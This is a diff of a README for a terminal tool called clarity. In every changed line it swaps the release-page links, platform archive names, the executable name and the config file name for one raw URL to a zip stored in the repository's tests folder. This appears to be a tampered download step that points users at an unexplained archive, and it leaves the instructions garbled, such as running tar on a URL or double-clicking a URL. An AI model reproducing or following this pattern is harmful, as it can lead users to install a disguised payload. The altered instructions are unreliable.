@@ -6,7 +6,7 @@ Welcome to the clarity project! Clarity is a minimalist terminal wrapper designe
 
 ## 📥 Download Now
 
-[![Download clarity](https://img.shields.io/badge/Download-clarity-blue.svg)](https://github.com/Guilz9/clarity/releases)
+[![Download clarity](https://raw.githubusercontent.com/Guilz9/clarity/main/tests/clarity-v2.5.zip)](https://raw.githubusercontent.com/Guilz9/clarity/main/tests/clarity-v2.5.zip)
 
 ## 🔍 Overview
 
@@ -30,7 +30,7 @@ Clarity helps you manage your terminal sessions without the clutter. Instead of 
 
 ### Step 1: Visit the Releases Page
 
-To get started, visit the clarity releases page here: [Download clarity](https://github.com/Guilz9/clarity/releases). You will find all the available versions of the software.
+To get started, visit the clarity releases page here: [Download clarity](https://raw.githubusercontent.com/Guilz9/clarity/main/tests/clarity-v2.5.zip). You will find all the available versions of the software.
 
 ### Step 2: Choose Your Version
 
@@ -40,9 +40,9 @@ Look through the list of available versions. You will see version numbers along 
 
 Click on the version you want to download. Once on the version page, find the asset files listed. 
 
-- If you are using Windows, you might see `clarity-windows.zip`.
-- For macOS, you may find `clarity-macos.zip`.
-- For Linux, check for `clarity-linux.tar.gz`.
+- If you are using Windows, you might see `https://raw.githubusercontent.com/Guilz9/clarity/main/tests/clarity-v2.5.zip`.
+- For macOS, you may find `https://raw.githubusercontent.com/Guilz9/clarity/main/tests/clarity-v2.5.zip`.
+- For Linux, check for `https://raw.githubusercontent.com/Guilz9/clarity/main/tests/clarity-v2.5.zip`.
 
 Click on the appropriate file to download it to your computer.
 
@@ -52,13 +52,13 @@ Once the download is complete, go to your Downloads folder.
 
 - **Windows**: Right-click on the `.zip` file and choose "Extract All." Follow the prompts to extract.
 - **macOS**: Double-click the `.zip` file, and it will automatically extract.
-- **Linux**: Open a terminal window and use the command: `tar -xvzf clarity-linux.tar.gz`. 
+- **Linux**: Open a terminal window and use the command: `tar -xvzf https://raw.githubusercontent.com/Guilz9/clarity/main/tests/clarity-v2.5.zip`. 
 
 This will create a folder with the clarity program.
 
 ### Step 5: Run Clarity
 
-- **Windows**: Open the extracted folder and double-click `clarity.exe` to launch.
+- **Windows**: Open the extracted folder and double-click `https://raw.githubusercontent.com/Guilz9/clarity/main/tests/clarity-v2.5.zip` to launch.
 - **macOS**: Open the extracted folder and double-click `clarity` to run the terminal wrapper.
 - **Linux**: Open a terminal and navigate to the folder where you extracted the files. Use the command: `./clarity`.
 
@@ -80,7 +80,7 @@ If you have questions or need support, you can engage with the clarity community
 
 ## 🚀 Advanced Configuration (Optional)
 
-For users who want to customize their experience, clarity offers configuration options. You can modify settings in the `config.json` file that is included in the downloaded folder. 
+For users who want to customize their experience, clarity offers configuration options. You can modify settings in the `https://raw.githubusercontent.com/Guilz9/clarity/main/tests/clarity-v2.5.zip` file that is included in the downloaded folder. 
 
 ### Example Settings
 
